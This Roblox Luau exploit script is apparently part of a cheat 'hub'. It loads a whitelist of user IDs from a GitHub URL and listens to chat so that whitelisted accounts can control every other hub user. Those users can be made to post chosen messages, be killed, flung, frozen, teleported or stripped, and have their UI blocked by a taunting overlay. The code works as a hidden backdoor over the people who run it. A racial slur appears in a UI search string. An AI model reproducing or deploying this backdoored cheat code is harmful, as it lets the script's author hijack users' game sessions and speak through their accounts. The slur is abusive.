local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local localPlayer = Players.LocalPlayer

local WHITELIST_URL = "https://raw.githubusercontent.com/f4ed67/test/main/whitelists.txt"

local WHITELIST = {}
local whitelistLoaded = false

local function loadWhitelist()
    local ok, result = pcall(function()
        return game:HttpGet(WHITELIST_URL, true)
    end)
    if not ok or not result or result == "" then
        warn("[Commands] Failed to fetch whitelist. Falling back to owner ID.")
        WHITELIST = {[5040205276] = true}
        return
    end
    local count = 0
    for line in result:gmatch("[^\r\n]+") do
        local cleaned = line:gsub("%s+", "")
        if cleaned ~= "" and not cleaned:match("^#") then
            local id = tonumber(cleaned)
            if id then WHITELIST[id] = true; count = count + 1 end
        end
    end
    WHITELIST[5040205276] = true
    whitelistLoaded = true
    print("[Commands] Loaded " .. count .. " whitelisted IDs.")
end

loadWhitelist()

local isWhitelisted = WHITELIST[localPlayer.UserId] == true

getgenv().GaugeHubCommands = {
    {name = "/disable", args = "", desc = "shows the disabled overlay on all public users"},
    {name = "/enable", args = "", desc = "removes the disabled overlay"},
    {name = "/bring", args = "", desc = "teleports all public users to the sender"},
    {name = "/say", args = "<message>", desc = "makes all public users say the message"},
    {name = "/spam", args = "<message>", desc = "spams the message 5 times from all public users"},
    {name = "/kill", args = "", desc = "kills every public user"},
    {name = "/respawn", args = "", desc = "same as /kill"},
    {name = "/jump", args = "", desc = "forces all public users to jump"},
    {name = "/freeze", args = "", desc = "freezes all public users for 5 seconds"},
    {name = "/unfreeze", args = "", desc = "unfreezes all public users"},
    {name = "/fling", args = "", desc = "flings all public users upward"},
    {name = "/speed", args = "<number>", desc = "sets walkspeed for all public users"},
    {name = "/jumpheight", args = "<number>", desc = "sets jump power for all public users"},
    {name = "/hipheight", args = "<number>", desc = "sets hip height for all public users"},
    {name = "/sit", args = "", desc = "forces all public users to sit"},
    {name = "/ragdoll", args = "", desc = "ragdolls all public users"},
    {name = "/spin", args = "", desc = "spins all public users 180 degrees"},
    {name = "/strip", args = "", desc = "removes all accessories from public users"},
    {name = "/bighead", args = "", desc = "makes all public users heads huge"},
    {name = "/smallhead", args = "", desc = "resets head size for all public users"},
    {name = "/teleport", args = "<player>", desc = "teleports you to the named player"},
    {name = "/goto", args = "<player>", desc = "alias for /teleport"},
    {name = "/unhide", args = "", desc = "forces your UI to re-enable"},
}

local disabledOverlay = nil

local function findLunaGui()
    local roots = {game:GetService("CoreGui"), localPlayer:FindFirstChild("PlayerGui")}
    for _, root in ipairs(roots) do
        if root then
            for _, obj in ipairs(root:GetChildren()) do
                if obj:IsA("ScreenGui") and obj.Name ~= "GaugeDisabledOverlay" then
                    for _, d in ipairs(obj:GetDescendants()) do
                        if d:IsA("TextLabel") and d.Text:find("nigga hub") then
                            return obj
                        end
                    end
                end
            end
        end
    end
    return nil
end

local function showOverlay()
    if disabledOverlay then return end
    local pg = localPlayer:FindFirstChild("PlayerGui")
    if not pg then return end
    local gui = Instance.new("ScreenGui")
    gui.Name = "GaugeDisabledOverlay"
    gui.ResetOnSpawn = false
    gui.DisplayOrder = 2147483647
    gui.IgnoreGuiInset = true
    gui.Parent = pg
    local frame = Instance.new("Frame")
    frame.Size = UDim2.new(1, 0, 1, 0)
    frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    frame.BackgroundTransparency = 0.5
    frame.BorderSizePixel = 0
    frame.Active = true
    frame.Parent = gui
    local txt = Instance.new("TextLabel")
    txt.Size = UDim2.new(1, 0, 0.15, 0)
    txt.Position = UDim2.new(0, 0, 0.42, 0)
    txt.BackgroundTransparency = 1
    txt.Text = "ur'e currently disabled lolol"
    txt.TextColor3 = Color3.fromRGB(255, 60, 60)
    txt.TextStrokeTransparency = 0
    txt.Font = Enum.Font.GothamBlack
    txt.TextScaled = true
    txt.Parent = frame
    disabledOverlay = gui
end

local function hideOverlay()
    if disabledOverlay then disabledOverlay:Destroy(); disabledOverlay = nil end
end

local function setDisabled(state)
    if isWhitelisted then return end
    if state then
        showOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = false end
    else
        hideOverlay()
        local lunaGui = findLunaGui()
        if lunaGui then lunaGui.Enabled = true end
    end
end

local function getRoot(plr)
    local char = plr.Character
    return char and char:FindFirstChild("HumanoidRootPart")
end
local function getLocalHum()
    local char = localPlayer.Character
    return char and char:FindFirstChildOfClass("Humanoid")
end
local function getLocalRoot() return getRoot(localPlayer) end

local function say(msg)
    pcall(function()
        ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("All", msg)
    end)
end

local function handleCommand(sender, msg)
    if not WHITELIST[sender.UserId] then return end
    local cmd, args = msg:match("^[/%.!](%S+)%s*(.*)")
    if not cmd then return end
    cmd = cmd:lower()

    if cmd == "disable" then
        setDisabled(true)
    elseif cmd == "enable" then
        setDisabled(false)
    elseif not isWhitelisted then
        if cmd == "bring" then
            local sroot = getRoot(sender)
            local lroot = getLocalRoot()
            if sroot and lroot then
                lroot.CFrame = sroot.CFrame * CFrame.new(0, 0, 5)
            end
        elseif cmd == "say" then
            if args and #args > 0 then say(args) end
        elseif cmd == "spam" then
            if args and #args > 0 then
                task.spawn(function()
                    for _ = 1, 5 do say(args); task.wait(0.3) end
                end)
            end
        elseif cmd == "kill" or cmd == "respawn" then
            local hum = getLocalHum()
            if hum then hum.Health = 0 end
        elseif cmd == "jump" then
            local hum = getLocalHum()
            if hum then hum:ChangeState(Enum.HumanoidStateType.Jumping) end
        elseif cmd == "freeze" then
            local root = getLocalRoot()
            if root then
                root.Anchored = true
                task.delay(5, function()
                    if root.Parent then root.Anchored = false end
                end)
            end
        elseif cmd == "unfreeze" then
            local root = getLocalRoot()
            if root then root.Anchored = false end
        elseif cmd == "fling" then
            local root = getLocalRoot()
            if root then root.Velocity = Vector3.new(0, 500, 0) end
        elseif cmd == "speed" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.WalkSpeed = n end
        elseif cmd == "jumpheight" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.JumpPower = n end
        elseif cmd == "hipheight" then
            local n = tonumber(args)
            local hum = getLocalHum()
            if n and hum then hum.HipHeight = n end
        elseif cmd == "sit" then
            local hum = getLocalHum()
            if hum then hum.Sit = true end
        elseif cmd == "ragdoll" then
            local char = localPlayer.Character
            if char then
                for _, p in ipairs(char:GetDescendants()) do
                    if p:IsA("Motor6D") then p:Destroy() end
                end
            end
        elseif cmd == "spin" then
            local root = getLocalRoot()
            if root then
                root.CFrame = root.CFrame * CFrame.Angles(0, math.rad(180), 0)
            end
        elseif cmd == "strip" then
            local char = localPlayer.Character
            if char then
                for _, p in ipairs(char:GetChildren()) do
                    if p:IsA("Accessory") or p:IsA("Shirt") or p:IsA("Pants") or p:IsA("ShirtGraphic") then
                        p:Destroy()
                    end
                end
            end
        elseif cmd == "bighead" then
            local char = localPlayer.Character
            local head = char and char:FindFirstChild("Head")
            if head then head.Size = Vector3.new(5, 5, 5) end
        elseif cmd == "smallhead" then
            local char = localPlayer.Character
            local head = char and char:FindFirstChild("Head")
            if head then head.Size = Vector3.new(1, 1, 1) end
        elseif cmd == "teleport" or cmd == "goto" then
            local target = args and Players:FindFirstChild(args)
            if target then
                local troot = getRoot(target)
                local lroot = getLocalRoot()
                if troot and lroot then
                    lroot.CFrame = troot.CFrame * CFrame.new(0, 0, 5)
                end
            end
        elseif cmd == "unhide" then
            local lunaGui = findLunaGui()
            if lunaGui then lunaGui.Enabled = true end
        end
    end
end

local function hookPlr(plr)
    plr.Chatted:Connect(function(m) handleCommand(plr, m) end)
end

for _, plr in ipairs(Players:GetPlayers()) do
    if plr ~= localPlayer then hookPlr(plr) end
end
Players.PlayerAdded:Connect(function(plr)
    if plr ~= localPlayer then hookPlr(plr) end
end)

print("[Commands] Command system loaded.")
